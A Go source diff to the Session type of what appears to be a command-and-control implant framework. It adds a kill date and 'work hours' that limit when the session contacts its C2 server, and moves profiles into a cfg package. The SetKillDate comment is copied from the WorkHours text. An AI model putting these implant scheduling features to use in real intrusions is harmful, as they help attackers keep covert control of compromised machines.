@@ -22,6 +22,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
@@ -50,7 +51,7 @@ type Session struct {
 	Created time.Time
 	connection
 
-	swap            Profile
+	swap            cfg.Profile
 	ch, wake        chan struct{}
 	parent          *Listener
 	send, recv, chn chan *com.Packet
@@ -62,6 +63,8 @@ type Session struct {
 	tick     *time.Ticker
 	peek     *com.Packet
 	host     container
+	kill     *time.Time
+	work     *cfg.WorkHours
 
 	Device device.Machine
 	sleep  time.Duration
@@ -85,6 +88,9 @@ func (*Session) accept(_ uint16) {}
 func (*Session) Listener() *Listener {
 	return nil
 }
+func (*Session) hasJob(_ uint16) bool {
+	return false
+}
 func (*Session) frag(_, _, _, _ uint16) {}
 func (*Session) handle(_ *com.Packet) bool {
 	return false
@@ -103,22 +109,23 @@ func (s *Session) SetJitter(j int) (*Job, error) {
 	return s.SetDuration(0, j)
 }
 
-// SetProfile will set the Profile used by this Session. This function will
-// ensure that the profile is marshalable before setting and will then pass it
-// to be set by the client Session (if this isn't one already).
+// SetKillDate sets the KillDate for this Session. This is a setting that controls
+// the date when this Session will shutdown automatically.
 //
-// If this is a server-side Session, this will trigger the sending of a MvProfile
-// Packet to update the client-side instance, which will update on it's next
-// wakeup cycle.
+// Use the WorkHours functions to create one or do it manually. If a nil value
+// is passed (or an empty WorkHours) this will clear the current WorkHours setting.
 //
-// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
-// setting the Profile and indicates that no Packet will be sent and that the
-// Job object result is nil.
-func (s *Session) SetProfile(p Profile) (*Job, error) {
-	if p == nil {
-		return nil, ErrInvalidProfile
+// Changing the WorkHours when there perviously was a non-nil setting will wake
+// the Session if it's sleeping.
+//
+// If this is a Server-side Session, the new value will be sent to the Client in
+// a MvTime Packet.
+func (s *Session) SetKillDate(t time.Time) (*Job, error) {
+	if t.IsZero() {
+		s.kill = nil
+	} else {
+		s.kill = &t
 	}
-	s.p = p
 	return nil, nil
 }
 
@@ -145,14 +152,59 @@ func (s *Session) SetSleep(t time.Duration) (*Job, error) {
 // setting the Profile and indicates that no Packet will be sent and that the
 // Job object result is nil.
 func (s *Session) SetProfileBytes(b []byte) (*Job, error) {
-	if ProfileParser == nil {
-		return nil, xerr.Sub("no Profile parser loaded", 0x44)
-	}
-	p, err := ProfileParser(b)
+	p, err := parseProfile(b)
 	if err != nil {
 		return nil, xerr.Wrap("parse Profile", err)
 	}
 	s.p = p
+	return nil, nil
+}
+
+// SetProfile will set the Profile used by this Session. This function will
+// ensure that the profile is marshalable before setting and will then pass it
+// to be set by the client Session (if this isn't one already).
+//
+// If this is a server-side Session, this will trigger the sending of a MvProfile
+// Packet to update the client-side instance, which will update on it's next
+// wakeup cycle.
+//
+// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
+// setting the Profile and indicates that no Packet will be sent and that the
+// Job object result is nil.
+func (s *Session) SetProfile(p cfg.Profile) (*Job, error) {
+	if p == nil {
+		return nil, ErrInvalidProfile
+	}
+	s.p = p
+	return nil, nil
+}
+
+// SetWorkHours sets the WorkingHours for this Session. This is a setting that
+// controls WHEN the Session will talk to the C2 Server.
+//
+// Use the WorkHours functions to create one or do it manually. If a nil value
+// is passed (or an empty WorkHours) this will clear the current WorkHours setting.
+//
+// Changing the WorkHours when there perviously was a non-nil setting will wake
+// the Session if it's sleeping.
+//
+// If this is a Server-side Session, the new value will be sent to the Client in
+// a MvTime Packet.
+func (s *Session) SetWorkHours(w *cfg.WorkHours) (*Job, error) {
+	if w == nil || w.Empty() {
+		if s.work != nil {
+			s.Wake()
+		}
+		s.work = nil
+		return nil, nil
+	}
+	if err := w.Verify(); err != nil {
+		return nil, err
+	}
+	if s.work != nil {
+		s.Wake()
+	}
+	s.work = w
 	return nil, nil
 }
 
